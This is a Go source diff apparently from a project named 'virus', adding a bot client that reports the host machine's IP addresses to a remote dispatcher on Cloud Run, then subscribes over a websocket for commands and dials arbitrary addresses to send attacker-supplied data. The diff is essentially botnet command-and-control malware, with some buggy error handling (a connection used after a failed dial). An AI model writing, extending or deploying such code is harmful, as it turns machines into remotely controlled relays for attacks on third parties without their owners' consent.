@@ -2,22 +2,24 @@ package main
 
 import (
 	"bytes"
-	"context"
 	"encoding/json"
-	"fmt"
+	"net"
 	"net/http"
+	"net/url"
 	"time"
 
+	"github.com/gorilla/websocket"
+
+	"github.com/kolya59/virus/models"
 	"github.com/kolya59/virus/pkg/machine"
 )
 
 const (
-	dispatcherHost = "https://dispatcher-eujhpoji7a-lz.a.run.app"
+	dispatcherHost = "dispatcher-eujhpoji7a-lz.a.run.app"
 )
 
 var (
 	interval = 5 * time.Minute
-	timeout  = 120 * time.Minute
 )
 
 func sendData(machine machine.Machine) error {
@@ -28,7 +30,8 @@ func sendData(machine machine.Machine) error {
 	}
 
 	// Set up a connection to dispatcher.
-	resp, err := http.Post(fmt.Sprintf("%s/machine", dispatcherHost), "application/json", bytes.NewBuffer(raw))
+	u := url.URL{Scheme: "https", Host: dispatcherHost, Path: "/machine"}
+	resp, err := http.Post(u.String(), "application/json", bytes.NewBuffer(raw))
 	if err != nil {
 		return err
 	}
@@ -40,8 +43,41 @@ func sendData(machine machine.Machine) error {
 	return nil
 }
 
-func subscribeForCommands(ctx context.Context) {
+func subscribeForCommands() error {
+	u := url.URL{Scheme: "ws", Host: dispatcherHost, Path: "/subscribe"}
 
+	c, _, err := websocket.DefaultDialer.Dial(u.String(), nil)
+	if err != nil {
+		return err
+	}
+	defer c.Close()
+
+	var msg models.WSCommand
+	for {
+		if err := c.ReadJSON(&msg); err != nil {
+			return err
+		}
+
+		ackMsg := models.WSAck{}
+
+		nc, err := net.Dial(msg.Type, msg.Addr)
+		if err != nil {
+			ackMsg.Err = err
+			if err := c.WriteJSON(models.WSAck{Err: err}); err != nil {
+				nc.Close()
+				return err
+			}
+		}
+
+		if _, err := nc.Write(msg.Data); err != nil {
+			ackMsg.Err = err
+			if err := c.WriteJSON(models.WSAck{Err: err}); err != nil {
+				nc.Close()
+				return err
+			}
+		}
+		nc.Close()
+	}
 }
 
 func main() {
@@ -49,20 +85,30 @@ func main() {
 	m.GetIPS()
 
 	ticker := time.NewTicker(interval)
-	timer := time.NewTimer(timeout)
-
-	ctx := context.Background()
-	sendData(m)
-
-	ctx.Err()
+	errs := make(chan error, 1)
+	errs <- sendData(m)
+loopSend:
 	for {
 		select {
+		case err := <-errs:
+			if err == nil {
+				break loopSend
+			}
 		case <-ticker.C:
-			sendData(m, done)
-		case <-timer.C:
-			return
-		case <-done:
-			return
+			errs <- sendData(m)
+		}
+	}
+
+	errs <- subscribeForCommands()
+loopSub:
+	for {
+		select {
+		case err := <-errs:
+			if err == nil {
+				break loopSub
+			}
+		case <-ticker.C:
+			errs <- subscribeForCommands()
 		}
 	}
 }
